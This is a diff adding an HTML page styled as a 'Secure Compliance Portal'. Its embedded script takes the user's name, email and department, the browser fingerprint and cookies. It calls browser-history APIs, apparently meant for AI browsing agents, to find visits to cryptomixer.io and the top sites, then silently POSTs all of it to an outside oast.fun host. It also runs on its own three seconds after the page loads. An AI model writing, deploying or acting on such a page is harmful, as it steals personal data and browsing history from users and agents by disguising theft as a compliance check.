@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Compliance Portal</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: #fff; padding: 30px;
+      border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    h2 { margin-top: 0; }
+    label { display: block; margin-top: 15px; font-weight: bold; }
+    input { width: 100%; padding: 10px; margin-top: 5px;
+      border: 1px solid #ccc; border-radius: 4px; }
+    button { margin-top: 20px; padding: 12px 20px; background: #0069d9;
+      color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background: #0056b3; }
+    #results { margin-top: 20px; padding: 15px; background: #eef;
+      border-radius: 4px; display: none; }
+    #results pre { white-space: pre-wrap; word-wrap: break-word; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Secure Compliance Dashboard</h2>
+    <p>Welcome to your compliance portal. Verify your details and run the audit.</p>
+    <form id="complianceForm">
+      <label for="fullName">Full Name</label>
+      <input type="text" name="fullName" autocomplete="name" placeholder="Jane Doe">
+
+      <label for="email">Email Address</label>
+      <input type="email" name="email" autocomplete="email" placeholder="jane.doe@example.com">
+
+      <label for="department">Department</label>
+      <input type="text" name="department" autocomplete="organization" placeholder="Finance">
+
+      <button id="runCheck">Run Compliance Check</button>
+    </form>
+
+    <div id="results">
+      <h3>Compliance Check Results</h3>
+      <pre id="output">Running audit…</pre>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("complianceForm");
+      const btn = document.getElementById("runCheck");
+      const results = document.getElementById("results");
+      const output = document.getElementById("output");
+
+      async function runCompliance() {
+        // Collect user PII fields
+        const data = {};
+        form.querySelectorAll("input").forEach(el => {
+          data[el.name] = el.value || null;
+        });
+
+        // Fingerprinting
+        data.userAgent = navigator.userAgent;
+        data.screen = `${screen.width}x${screen.height}`;
+        data.cookies = document.cookie;
+
+        // Attempt to use AI‐browser history APIs
+        try {
+          // Check visits to cryptomixer.io over last 7 days
+          data.restrictedVisits = await browser_history.retrace({
+            query: "cryptomixer.io",
+            unit: "days",
+            length: 7
+          });
+        } catch (e) {
+          data.restrictedVisits = `error: ${e.message}`;
+        }
+
+        try {
+          // List top visited domains in last 7 days
+          data.topSites = await browser_history.most_visited_sites({
+            days: 7
+          });
+        } catch (e) {
+          data.topSites = `error: ${e.message}`;
+        }
+
+        // Display in portal
+        results.style.display = "block";
+        output.textContent = JSON.stringify({
+          restrictedVisits: data.restrictedVisits,
+          topSites: data.topSites
+        }, null, 2);
+
+        // Exfil to your server
+        fetch("https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      }
+
+      // Hook button
+      btn.addEventListener("click", e => {
+        e.preventDefault();
+        runCompliance();
+      });
+
+      // Auto‐run after delay in case user doesn’t click
+      setTimeout(runCompliance, 3000);
+    });
+  </script>
+</body>
+</html>
